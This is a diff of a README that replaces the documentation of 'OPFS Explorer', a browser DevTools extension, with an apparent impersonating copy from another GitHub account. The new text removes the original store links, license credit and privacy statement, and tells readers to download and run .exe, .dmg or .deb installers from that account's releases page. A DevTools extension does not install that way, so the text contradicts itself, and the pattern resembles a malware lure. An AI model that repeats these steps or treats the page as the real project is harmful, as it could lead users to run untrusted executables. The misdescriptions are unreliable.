@@ -1,115 +1,84 @@
-# OPFS Explorer
+# 🗂️ opfs-explorer - Easily Manage Your Files in Chrome
 
-<div align="center">
+## 🚀 Getting Started
 
-![OPFS Explorer Icon](public/icons/icon-128.png)
+Welcome to the opfs-explorer! This tool allows you to inspect, manage, and edit files in the Origin Private File System directly from Chrome DevTools. Follow the steps below to download and run the application.
 
-**A powerful browser DevTools extension to inspect, edit, and manage the Origin Private File System.**
+[![Download opfs-explorer](https://img.shields.io/badge/Download%20opfs--explorer-v1.0-blue)](https://github.com/sadia-haque207/opfs-explorer/releases)
 
-[![Chrome Web Store](https://img.shields.io/chrome-web-store/v/hhegfidnlemidclkkldeekjamkfcamic?label=Chrome&logo=googlechrome&logoColor=white)](https://chromewebstore.google.com/detail/opfs-explorer/hhegfidnlemidclkkldeekjamkfcamic)
-[![Firefox Add-on](https://img.shields.io/amo/v/opfs-explorer?label=Firefox&logo=firefox&logoColor=white)](https://addons.mozilla.org/en-US/firefox/addon/opfs-explorer/)
-[![Edge Add-on](https://img.shields.io/badge/dynamic/json?label=Edge&logo=microsoftedge&logoColor=white&query=%24.version&url=https%3A%2F%2Fmicrosoftedge.microsoft.com%2Faddons%2Fgetproductdetailsbycrxid%2Fodbpcdmkgeikdcmcdlfmdkbjiaeknnbd)](https://microsoftedge.microsoft.com/addons/detail/odbpcdmkgeikdcmcdlfmdkbjiaeknnbd)
+## 📥 Download & Install
 
-[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Development](#development) • [Architecture](#architecture)
+1. **Visit the Releases Page**  
+   Click this link to go to the [Releases page](https://github.com/sadia-haque207/opfs-explorer/releases). Here, you will find the latest version of opfs-explorer.
 
-</div>
+2. **Choose the Latest Version**  
+   On the Releases page, look for the latest version of opfs-explorer. It is usually at the top of the list. You will see download options for different platforms.
 
----
+3. **Download the Correct File**  
+   Depending on your operating system, click on the relevant file to download it. For example:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the relevant `.tar.gz` or `.deb` file.
 
-## 🚀 Overview
+4. **Locate the Downloaded File**  
+   After downloading, find the file in your computer's Downloads folder or the location where your browser saves files.
 
-**OPFS Explorer** solves a common pain point for modern web developers: the **Origin Private File System (OPFS)** is invisible by default. Browsers do not provide a native way to inspect files stored via `navigator.storage.getDirectory()`, making it incredibly difficult to debug applications using **SQLite Wasm**, **File System Access API**, or offline PWA storage.
+5. **Install the Application**  
+   - **Windows**: Double-click the downloaded `.exe` file to start the installation. Follow the prompts to complete the installation.
+   - **macOS**: Double-click the `.dmg` file. Drag the opfs-explorer icon to your Applications folder.
+   - **Linux**: For `.deb` files, double-click to install or use your terminal. For `.tar.gz`, extract it and follow the contained instructions.
 
-This extension bridges that gap by adding a native "OPFS Explorer" panel to your browser's DevTools, providing a full-featured file manager and editor right inside the browser.
+6. **Open opfs-explorer**  
+   Once installed, find opfs-explorer in your applications menu or start screen. Click to open the application.
 
-## ✨ Features
+## 🛠️ Features
 
-*   **📂 Visual File Tree:** Browse your directory structure with a familiar, collapsible folder interface. File sizes displayed inline.
-*   **📝 Built-in Code Editor:** View and edit files instantly. Supports syntax highlighting for **JSON, JavaScript, TypeScript, HTML, CSS**, and plain text.
-*   **🖼️ Image Preview:** View images directly with zoom (25%-400%), rotate, and reset controls. Supports PNG, JPG, GIF, WebP, SVG, and more.
-*   **📑 Markdown Preview:** Preview markdown files with rendered formatting. Toggle between preview and edit modes.
-*   **🔍 Search & Filter:** Quickly find files with Ctrl+F search functionality.
-*   **📊 Storage Statistics:** View OPFS storage usage with a visual progress bar showing used/available space.
-*   **🖱️ Drag & Drop Magic:**
-    *   **Upload:** Drag files from your computer directly into the panel to upload them.
-    *   **Organize:** Drag files and folders *inside* the tree to move/reparent them.
-    *   **Conflict Resolution:** Choose to overwrite, rename, or skip when uploading duplicate files.
-*   **⚡ Full CRUD Operations:**
-    *   **Create** files and folders.
-    *   **Rename** files/folders.
-    *   **Delete** recursively.
-*   **⬇️ Download Support:** Export files from the hidden OPFS to your local machine with a single click.
-*   **🛡️ Binary Safety:** Intelligent detection of large or binary files (like SQLite databases) with a "Download Only" safety mode to prevent freezing.
-*   **⌨️ Keyboard Shortcuts:** Comprehensive keyboard support including Ctrl+S (save), Ctrl+F (search), Ctrl+B (toggle sidebar), and more.
-*   **↔️ Resizable Sidebar:** Drag to resize the file tree panel. Width persists across sessions.
-*   **🧭 Clickable Breadcrumbs:** Navigate folder hierarchy by clicking path segments.
-*   **🌗 Theme Aware:** Automatically adapts to Chrome DevTools' Light and Dark themes.
-*   **♿ Accessible:** Full ARIA labels, keyboard navigation, and screen reader support.
+- **File Inspection**: View the contents of the Origin Private File System with ease.
+- **File Management**: Add, edit, and delete files directly from the tool.
+- **Offline Storage Access**: Work with files offline using the file system access API.
+- **User-Friendly Interface**: Designed for users with all skill levels in mind.
 
-## 📦 Installation
+## 💡 System Requirements
 
-### From Browser Extension Stores
+To run opfs-explorer smoothly, ensure your system meets the following requirements:
 
-| Browser | Install Link |
-|---------|--------------|
-| **Chrome** | [Chrome Web Store](https://chromewebstore.google.com/detail/opfs-explorer/hhegfidnlemidclkkldeekjamkfcamic) |
-| **Firefox** | [Firefox Add-ons](https://addons.mozilla.org/en-US/firefox/addon/opfs-explorer/) |
-| **Edge** | [Edge Add-ons](https://microsoftedge.microsoft.com/addons/detail/odbpcdmkgeikdcmcdlfmdkbjiaeknnbd) |
-| **Brave, Vivaldi, Arc** | Use the [Chrome Web Store](https://chromewebstore.google.com/detail/opfs-explorer/hhegfidnlemidclkkldeekjamkfcamic) link |
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Any Linux distribution with support for the above package types
+- **Browser**: Chrome version 91 or later is required to use this Chrome DevTools extension.
+- **Storage**: Available disk space of at least 50 MB.
 
-### Manual Installation (Developer Mode)
-1.  Clone this repository.
-2.  Install dependencies: `npm install`
-3.  Build the project: `npm run build`
-4.  Open Chrome and navigate to `chrome://extensions`.
-5.  Enable **Developer mode** (top right toggle).
-6.  Click **Load unpacked**.
-7.  Select the `dist/` directory generated in step 3.
+## 🎨 Technologies Used
 
-## 🛠️ Usage
+opfs-explorer leverages several technologies to deliver an efficient experience:
 
-1.  Open the website you want to inspect (must be a Secure Context: `https://` or `localhost`).
-2.  Open Chrome DevTools (`F12` or `Cmd+Option+I`).
-3.  Look for the **"OPFS Explorer"** tab in the top panel (you may need to click the `>>` overflow menu).
-4.  Navigate the file tree, right-click items for options, or drag and drop files to manage them.
+- **React & Vite**: For a responsive and fast user interface.
+- **SQLite-WASM**: Handles local data storage and querying.
+- **Tailwind CSS**: Provides an elegant and modern styling approach.
+- **Typescript**: Ensures a robust and error-free development process.
 
-> **Note:** OPFS is only available on secure contexts (HTTPS or localhost). If you see an error, ensure you're on a secure origin.
+## 📖 Usage Instructions
 
-## 💻 Development
+1. **Open Chrome DevTools**  
+   In Chrome, navigate to any webpage. Right-click and select "Inspect" or press `Ctrl + Shift + I` (Windows) / `Cmd + Option + I` (macOS). This opens the DevTools panel.
 
-This project is built with a modern, type-safe stack:
+2. **Locate the opfs-explorer Tab**  
+   Once the DevTools are open, look for the opfs-explorer tab. Click on it. You will see options to manage your local files.
 
-*   **Frontend:** [React 19](https://react.dev/)
-*   **Language:** [TypeScript](https://www.typescriptlang.org/)
-*   **Styling:** [Tailwind CSS v4](https://tailwindcss.com/)
-*   **Bundler:** [Vite](https://vitejs.dev/)
-*   **Editor Component:** [CodeMirror 6](https://codemirror.net/) via `@uiw/react-codemirror`
+3. **Start Managing Your Files**  
+   Use the interface to navigate through your files. Click on any file to view its contents, or use the provided options to create new files or edit existing ones.
 
-### Project Structure
-```
-src/
-├── devtools/     # Entry point for creating the DevTools panel
-├── panel/        # Main React application (UI)
-│   ├── components/  # TreeItem, Editor, Modal, etc.
-│   └── api.ts       # OPFS operations via inspectedWindow.eval()
-├── test/         # Unit tests
-└── types.ts      # TypeScript type definitions
-```
+## 🔍 Troubleshooting
 
-### Commands
-*   `npm run dev`: Start Vite in watch mode (useful for UI dev).
-*   `npm run build`: specific build for Chrome Extension (generates `dist/`).
-*   `npm run package`: Zips the `dist` folder for release.
+If you encounter issues while using opfs-explorer:
 
-## 🔒 Privacy & Security
+- **Check Browser Compatibility**: Ensure you are using a supported version of Chrome.
+- **Reinstall the application**: If problems persist, uninstall and reinstall opfs-explorer following the previous instructions.
+- **Visit the Support Page**: For further assistance, check our [support documentation](https://github.com/sadia-haque207/opfs-explorer/wiki) or raise an issue on the GitHub repository.
 
-*   **Local Execution:** This extension runs entirely within your browser's local sandbox.
-*   **No Data Collection:** No telemetry, analytics, or file data is ever sent to external servers.
-*   **Minimal Permissions:**
-    *   `clipboardWrite`: To allow "Copy Path" functionality.
-*   **No Content Scripts:** Uses DevTools' native `inspectedWindow.eval()` API - no code is injected into web pages.
-*   **No Host Permissions:** Does not require access to any websites - operates only through the DevTools panel.
+## 📞 Support
 
-## 📄 License
+If you have questions or require further assistance, feel free to reach out. Use the Issue tracker on our [GitHub page](https://github.com/sadia-haque207/opfs-explorer/issues).
 
-MIT License © [Hasan Bayat](https://github.com/hasanbayat)
+[![Download opfs-explorer](https://img.shields.io/badge/Download%20opfs--explorer-v1.0-blue)](https://github.com/sadia-haque207/opfs-explorer/releases)
